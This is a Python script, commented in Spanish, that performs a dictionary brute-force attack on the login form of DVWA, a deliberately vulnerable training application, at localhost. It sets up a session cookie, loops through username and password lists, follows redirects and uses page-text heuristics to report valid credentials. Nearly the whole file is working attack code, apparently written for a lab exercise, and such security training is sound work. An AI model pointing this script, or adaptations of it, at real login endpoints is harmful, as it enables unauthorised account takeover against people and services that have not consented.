#!/usr/bin/env python3
"""
DVWA Brute Force Attack - Script actualizado (seguir redirección)
- Si la respuesta inicial es 302 el script sigue la Location y analiza la página final.
- Requisitos: requests  (pip install requests)
- Uso (ejemplo): python3 brute_verify_follow.py
"""

import requests
import time
from itertools import product
from typing import List, Tuple
from urllib.parse import urljoin

# ---------- CONFIG ----------
BASE_URL = "http://localhost:8080"
TARGET_URL = f"{BASE_URL}/vulnerabilities/brute/"
# Si quieres forzar un PHPSESSID concreto escribe el valor aquí (opcional).
# Si lo dejas vacío el script obtiene uno automáticamente.
SESSION_ID = ""  # ej. "9ipdtlmcf7aumbu5dq0jpshud1"

USERNAMES = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
PASSWORDS = ['password', 'abc123', 'charley', 'letmein', 'michael']

DELAY = 0.15   # segundos entre intentos
TIMEOUT = 5    # timeout para requests
# Si quieres que el script salga al primer éxito, pon True
STOP_AT_FIRST_SUCCESS = True
# ---------- END CONFIG ----------


def prepare_session(sess: requests.Session):
    """
    Prepara la sesión: si SESSION_ID está vacío, hace una petición inicial para obtener cookies.
    Si SESSION_ID no está vacío, la inserta en la cookie jar.
    """
    if SESSION_ID:
        sess.cookies.set("PHPSESSID", SESSION_ID, domain="localhost")
        sess.cookies.set("security", "low", domain="localhost")
        print(f"[i] Usando PHPSESSID forzado: {SESSION_ID}")
    else:
        try:
            r = sess.get(TARGET_URL, timeout=TIMEOUT)
            sid = sess.cookies.get("PHPSESSID")
            print(f"[i] PHPSESSID obtenido automáticamente: {sid}")
        except Exception as e:
            print(f"[!] No se pudo obtener cookie inicial: {e}")


def test_credentials(sess: requests.Session, username: str, password: str) -> Tuple[bool, str]:
    """
    Prueba una combinación (username, password).
    Devuelve (es_valida: bool, motivo: str)
    """
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    try:
        # Primera petición sin seguir redirecciones para inspeccionar Location/302
        r = sess.get(TARGET_URL, params=params, timeout=TIMEOUT, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        return False, f"error request: {e}"

    status = r.status_code
    location = r.headers.get("Location", "")

    # Si hay 302, seguimos la redirección (con cookies ya presentes)
    if status == 302:
        # Construir URL absoluta si 'location' es relativa
        follow_url = location if location.startswith("http") else urljoin(TARGET_URL, location)
        try:
            r2 = sess.get(follow_url, timeout=TIMEOUT, allow_redirects=True)
            body_final = (r2.text or "").lower()
        except requests.exceptions.RequestException as e:
            return False, f"302 -> {location} but follow error: {e}"

        # Comprobar indicadores en la página final
        if "logout" in body_final or "welcome" in body_final or "you are logged in" in body_final:
            return True, f"302 -> {location} then final page shows session"
        if 'name="username"' in body_final or "username:" in body_final:
            return False, f"302 -> {location} then final page shows login form (fallo)"
        # Si no es claro, también podemos considerar éxito si la Location NO apunta al login
        if "login.php" not in location.lower():
            return True, f"302 -> {location} (no apunta a login.php) — posible éxito (manual confirm)"
        return False, f"302 -> {location} then final page ambiguous"

    # Si no hay 302, analizamos el body directamente
    body = (r.text or "").lower()
    if "logout" in body or "welcome" in body or "you are logged in" in body:
        return True, "200 + contenido de sesión (éxito)"
    if 'name="username"' in body or "username:" in body:
        return False, "200 + login form (fallo)"
    # Caso ambiguo
    return False, "200 ambiguous (sin formulario ni texto claro) - inspeccionar"

def brute_force_attack(usernames: List[str], passwords: List[str]) -> List[Tuple[str,str,str]]:
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Python/requests"})
    prepare_session(sess)

    total = len(usernames) * len(passwords)
    count = 0
    valid = []

    print(f"[*] Iniciando ataque de fuerza bruta")
    print(f"[*] Total de combinaciones a probar: {total}")
    print(f"[*] Target: {TARGET_URL}\n")
    start = time.time()

    for u, p in product(usernames, passwords):
        count += 1
        print(f"[{count}/{total}] Probando {u}:{p} ...", end=" ", flush=True)
        ok, reason = test_credentials(sess, u, p)
        if ok:
            print("✓ VÁLIDO --", reason)
            valid.append((u, p, reason))
            if STOP_AT_FIRST_SUCCESS:
                break
        else:
            print("✗", reason)
        time.sleep(DELAY)

    elapsed = time.time() - start
    print(f"\n[*] Ataque completado en {elapsed:.2f} segundos")
    print(f"[*] Velocidad aprox: {total/elapsed:.2f} intentos/segundo")
    return valid


def main():
    creds = brute_force_attack(USERNAMES, PASSWORDS)
    print("\n" + "="*40)
    print("RESULTADOS")
    print("="*40)
    if creds:
        for u,p,r in creds:
            print(f"Usuario: {u:10s} | Password: {p:12s} | motivo: {r}")
    else:
        print("No se encontraron credenciales válidas según las heurísticas usadas.")
    print("="*40)


if __name__ == "__main__":
    main()
